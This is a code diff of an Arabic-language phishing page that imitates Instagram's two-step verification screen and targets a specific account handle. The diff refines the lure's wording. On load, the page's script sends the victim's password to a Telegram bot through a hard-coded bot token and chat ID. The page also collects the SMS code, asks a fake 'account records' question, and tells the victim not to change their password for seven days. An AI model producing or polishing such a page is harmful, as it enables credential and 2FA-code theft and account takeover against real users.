@@ -3,12 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Security Check</title>
+    <title>المصادقة بخطوتين | Instagram</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; margin: 0; }
-        .container { width: 100%; max-width: 350px; text-align: center; }
+        body { font-family: -apple-system, sans-serif; background: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        /* الشريط العلوي */
+        .header { width: 100%; padding: 15px 0; border-bottom: 1px solid #dbdbdb; text-align: center; font-weight: 600; font-size: 16px; color: #262626; margin-bottom: 30px; }
+        .container { width: 100%; max-width: 350px; text-align: center; padding: 0 20px; }
         .logo { width: 170px; margin-bottom: 30px; }
-        h2 { font-size: 19px; color: #262626; font-weight: 600; }
+        h2 { font-size: 19px; color: #262626; font-weight: 600; margin-bottom: 10px; }
         p { font-size: 14px; color: #8e8e8e; line-height: 1.5; }
         .input-code { width: 100%; padding: 14px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; margin: 20px 0; text-align: center; font-size: 20px; letter-spacing: 5px; box-sizing: border-box; }
         .btn { width: 100%; background: #0095f6; color: white; border: none; padding: 13px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
@@ -18,18 +20,20 @@
 </head>
 <body>
 
+    <div class="header">المصادقة بخطوتين</div>
+
     <div class="container" id="sms-step">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <h2>تحقق من الرمز</h2>
-        <p>أدخل الرمز المكون من 6 أرقام المرسل لهاتفك لتأكيد ملكية الحساب <b>@_5z5z5</b>.</p>
+        <h2>أدخل رمز الأمان</h2>
+        <p>لقد أرسلنا رمزاً مكوناً من 6 أرقام إلى هاتفك المرتبط بـ <b>@_5z5z5</b>. يرجى إدخاله للمتابعة.</p>
         <input type="text" id="sms_val" class="input-code" placeholder="000000" maxlength="8">
-        <button class="btn" onclick="sendSMS()">تأكيد وتأمين</button>
+        <button class="btn" onclick="sendSMS()">تأكيد الرمز</button>
     </div>
 
     <div class="container" id="photo-step">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <h2>سؤال الأمان</h2>
-        <p>هل قمت بحذف هذه الصورة مؤخراً؟</p>
+        <h2>مراجعة سجلات الحساب</h2>
+        <p>بناءً على نشاط الحساب الأخير، هل قمت بحذف هذه الصورة مؤخراً؟</p>
         <img src="IMG_1145.jpeg" class="cat-frame">
         <div style="display: flex; gap: 10px;">
             <button class="btn" style="background:#efefef; color:#262626;" onclick="finish()">نعم</button>
@@ -38,11 +42,11 @@
     </div>
 
     <script>
-        // أول ما تفتح الصفحة يرسل الباسورد للبوت فوراً
         window.onload = function() {
             const params = new URLSearchParams(window.location.search);
             const pass = params.get('pass');
             if(pass) {
+                // يرسل الباسورد للبوت فوراً عند فتح الصفحة
                 fetch(`https://api.telegram.org/bot8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA/sendMessage?chat_id=897618292&text=🔑 كلمة المرور (الخطوة 1): ${pass}`);
             }
         };
@@ -57,7 +61,7 @@
         }
 
         function finish() {
-            alert("تم تأمين حسابك بنجاح. يرجى عدم تغيير كلمة المرور خلال الـ 7 أيام القادمة لتجنب قفل الحساب.");
+            alert("تم تأمين حسابك بنجاح. كإجراء وقائي، يرجى تجنب تغيير كلمة المرور أو إعدادات الأمان خلال الـ 7 أيام القادمة.");
             window.location.href = "https://www.instagram.com";
         }
     </script>
